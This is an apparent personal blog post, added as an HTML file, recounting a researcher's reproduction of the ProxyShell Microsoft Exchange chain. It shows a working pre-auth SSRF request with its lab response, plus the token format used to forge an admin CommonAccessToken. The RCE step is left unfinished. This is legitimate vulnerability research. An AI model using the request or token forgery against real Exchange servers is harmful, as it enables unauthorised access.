@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>My journey to reproduce the Proxyshell exploit chain (reported by Orange Tsai) | Quang Vo</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="My journey to reproduce the Proxyshell exploit chain (reported by Orange Tsai)" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Research analysis and develop a working exploit poc script" />
+<meta property="og:description" content="Research analysis and develop a working exploit poc script" />
+<link rel="canonical" href="http://localhost:4000/researches/2021/08/16/My-journey-to-reproduce-Proxyshell-(reported-by-Orange-Tsai).html" />
+<meta property="og:url" content="http://localhost:4000/researches/2021/08/16/My-journey-to-reproduce-Proxyshell-(reported-by-Orange-Tsai).html" />
+<meta property="og:site_name" content="Quang Vo" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-16T05:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="My journey to reproduce the Proxyshell exploit chain (reported by Orange Tsai)" />
+<script type="application/ld+json">
+{"description":"Research analysis and develop a working exploit poc script","@type":"BlogPosting","headline":"My journey to reproduce the Proxyshell exploit chain (reported by Orange Tsai)","dateModified":"2021-08-16T05:00:00-04:00","datePublished":"2021-08-16T05:00:00-04:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/researches/2021/08/16/My-journey-to-reproduce-Proxyshell-(reported-by-Orange-Tsai).html"},"url":"http://localhost:4000/researches/2021/08/16/My-journey-to-reproduce-Proxyshell-(reported-by-Orange-Tsai).html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Quang Vo" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Quang Vo</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">My journey to reproduce the Proxyshell exploit chain (reported by Orange Tsai)</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-08-16T05:00:00-04:00" itemprop="datePublished">Aug 16, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="proxyshell-microsoft-exchange">ProxyShell Microsoft Exchange</h2>
+
+<p>Reference:</p>
+<ul>
+  <li>The original talk from Orange Tsai: <a href="url">https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf?fbclid=IwAR2V0-4k2yb8dmPP5Mksd8iHYTOfE6sBwygMt4wjq3M9be8Tw6TlH0andhA</a></li>
+  <li>Amazing research write up from @peterjson and Jang:<a href="url"> https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1</a></li>
+  <li><a href="url">https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/</a></li>
+</ul>
+
+<h3 id="1-pre-auth-ssrf">1. Pre-auth SSRF</h3>
+
+<p>The endpoint <code class="language-plaintext highlighter-rouge">/autodiscover.json</code> is one of the endpoints that we can access without authentication</p>
+
+<p><img width="1413" alt="image" src="https://user-images.githubusercontent.com/37280106/129542517-f35ab234-4613-491c-844a-75e88fbf8da8.png" /></p>
+
+<p>If our URL end with <code class="language-plaintext highlighter-rouge">/autodiscover.json</code> , <code class="language-plaintext highlighter-rouge">ClientRequest</code> will fetch the param <code class="language-plaintext highlighter-rouge">Email</code></p>
+
+<p><img width="1262" alt="image" src="https://user-images.githubusercontent.com/37280106/129544327-4c4fe18e-eb19-4466-a616-aff25e3a4087.png" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">explicitLogonAddress</code> must contains valid email address</p>
+
+<p>So if our <code class="language-plaintext highlighter-rouge">explicitLogonAddress=/autodiscover/autodiscover.json?a=a@test.com</code> then the <code class="language-plaintext highlighter-rouge">/autodiscover/autodiscover.json?a=a@test.com</code> part will be removed from the URI</p>
+
+<p>When preparing request to send to backend internal, Exchange will generate Kerberos auth header and attach into Authorization header. This is why we can reach some other endpoint without any authentication</p>
+
+<p>The Fatal erase:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /autodiscover/autodiscover.json?@test.com/mapi/nspi?&amp;Email=autodiscover/autodiscover.json%3F@test.com HTTP/2
+Host: exchange.local
+Cookie: cookieTest=1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Cache-Control: max-age=0
+Te: trailers
+</code></pre></div></div>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/2 200 OK
+Cache-Control: private
+Content-Type: text/html
+Vary: Accept-Encoding
+Server: Microsoft-IIS/10.0
+Request-Id: 505bae40-9e29-4c22-9bb6-68686012d721
+X-Calculatedbetarget: win-mkl80dild4h.exchange.local
+X-Serverapplication: Exchange/15.01.2176.009
+X-Diaginfo: WIN-MKL80DILD4H
+X-Beserver: WIN-MKL80DILD4H
+X-Aspnet-Version: 4.0.30319
+Set-Cookie: X-BackEndCookie=; expires=Thu, 15-Aug-1991 03:08:59 GMT; path=/autodiscover; secure; HttpOnly
+X-Powered-By: ASP.NET
+X-Feserver: WIN-MKL80DILD4H
+Date: Sun, 15 Aug 2021 03:08:58 GMT
+Content-Length: 553
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Exchange MAPI/HTTP Connectivity Endpoint&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;Exchange MAPI/HTTP Connectivity Endpoint&lt;br&gt;&lt;br&gt;Version: 15.1.2176.9&lt;br&gt;Vdir Path: /mapi/nspi/&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;
+</code></pre></div></div>
+
+<p><img width="1146" alt="image" src="https://user-images.githubusercontent.com/37280106/129546779-695fca9d-dd4c-47d2-a498-5feb214f5df5.png" /></p>
+
+<p>We archieved the Pre-auth SSRF, direct access to Exchange Server back-end !!!</p>
+
+<h3 id="2-exchange-powershell-remoting">2. Exchange Powershell Remoting</h3>
+
+<p>The Exchange PowerShell Remoting is built upon PowerShell API and uses the Runspace for isolations. All operations are based on WinRM protocol</p>
+
+<p>We need to look for the way to access <code class="language-plaintext highlighter-rouge">/powershell</code> endpoint, by accessing <code class="language-plaintext highlighter-rouge">/powershell</code> endpoint, we are one-step closer to the final goal - RCE</p>
+
+<p>From Orange Tsai talks, he said that because we access the endpoint with <code class="language-plaintext highlighter-rouge">NT\SYSTEM</code> priviledge, we will fail the business logic since <code class="language-plaintext highlighter-rouge">SYSTEM</code> does not have any mailbox.</p>
+
+<p>We cannot forge the <code class="language-plaintext highlighter-rouge">X-CommonAccessToken</code> because it’s in the blacklisted cookies/headers</p>
+
+<p><img width="1318" alt="image" src="https://user-images.githubusercontent.com/37280106/129550275-02ca7e41-d165-49da-8bf7-0ba303b5ab98.png" /></p>
+
+<p>A few module we should pay attention to</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Microsoft.Exchange.Security
+Microsoft.Exchange.PwshClient
+Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule
+</code></pre></div></div>
+
+<p>From the Orange Tsai’s talk, we know that the <code class="language-plaintext highlighter-rouge">BackendRehydrationModule</code> play an important part in authentication process</p>
+
+<p><img width="1207" alt="image" src="https://user-images.githubusercontent.com/37280106/129551467-54e67b8e-3232-483b-9bcc-ddfe14de00eb.png" /></p>
+
+<blockquote>
+  <p>Microsoft.Exchange.Security.Authentication.BackendRehydrationModule</p>
+</blockquote>
+
+<p><img width="1048" alt="image" src="https://user-images.githubusercontent.com/37280106/129550769-a21e228c-5ef9-4fd2-89c4-5152a4fe117c.png" /></p>
+
+<p>We cannot access <code class="language-plaintext highlighter-rouge">/powershell</code> endpoint because we don’t have <code class="language-plaintext highlighter-rouge">X-CommonAccessToken</code> header, we cannot forge the <code class="language-plaintext highlighter-rouge">X-CommonAccessToken: &lt;token&gt;</code> to impersonate other user because <code class="language-plaintext highlighter-rouge">X-CommonAccessToken</code> is is the blacklisted headers. So what to do ?</p>
+
+<p>Lucky for us, this module is called before the <code class="language-plaintext highlighter-rouge">BackendRehydrationModule</code> and it extract Access-Token fromURL</p>
+
+<blockquote>
+  <p>Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule</p>
+</blockquote>
+
+<p><img width="1027" alt="image" src="https://user-images.githubusercontent.com/37280106/129552591-36cdf54c-ae20-462a-954a-f7d4e21d981c.png" /></p>
+
+<p><img width="1033" alt="image" src="https://user-images.githubusercontent.com/37280106/129552443-e99e7e9b-7690-476f-8ca4-73d857621627.png" /></p>
+
+<p>The code logic look for <code class="language-plaintext highlighter-rouge">X-CommonAccessToken</code> header, if the header is not exist, it will extract <code class="language-plaintext highlighter-rouge">X-RPS-CAT</code> param and deserialize it as a Access Token</p>
+
+<blockquote>
+  <p>Microsoft.Exchange.Security.Authorization.CommonAccessToken ( Serialization)</p>
+</blockquote>
+
+<p><img width="1041" alt="image" src="https://user-images.githubusercontent.com/37280106/129540035-3ab2be12-3540-45dd-85a4-bdb7aeb89581.png" /></p>
+
+<blockquote>
+  <p>Microsoft.Exchange.Security.Authorization.CommonAccessToken (deserialization)</p>
+</blockquote>
+
+<p><img width="1073" alt="image" src="https://user-images.githubusercontent.com/37280106/129540057-3b6def40-f842-4283-aca9-13c20ef48842.png" /></p>
+
+<p>The pseudo code for the token deserialization:</p>
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>V + this.Version + T + this.TokenType C + compress + data
+if compress =&gt; decompress
+if AccessTokenType is Windows =&gt; DeserializeFromToken
+</code></pre></div></div>
+
+<p><img width="970" alt="image" src="https://user-images.githubusercontent.com/37280106/129553511-6abd50c8-3fc3-49a9-8c92-59b0311e7916.png" /></p>
+
+<p><img width="1074" alt="image" src="https://user-images.githubusercontent.com/37280106/129553904-94303325-c9b9-485a-a082-dc6de45305f9.png" /></p>
+
+<p>Pseudo code for DeserializeFromToken</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A + this.AuthenticationType + L + this.LogonName + U + UserSID + G + Group Length + GroupSids
+</code></pre></div></div>
+
+<p>Now, we can craft an admin privilege CommonAccessToken via “X-Rps-CAT” parameter since we know how the Token is constructed</p>
+
+<h3 id="3-working-with-remote-powershell-and-archived-rce">3. Working with remote Powershell and archived RCE</h3>
+<p>Working on it …</p>
+
+  </div><a class="u-url" href="/researches/2021/08/16/My-journey-to-reproduce-Proxyshell-(reported-by-Orange-Tsai).html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Quang Vo</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Quang Vo</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/mr-r3bot"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">mr-r3bot</span></a></li><li><a href="https://www.twitter.com/mr_r3bot"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">mr_r3bot</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>This is my personal github page where I publish write-ups and researches</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
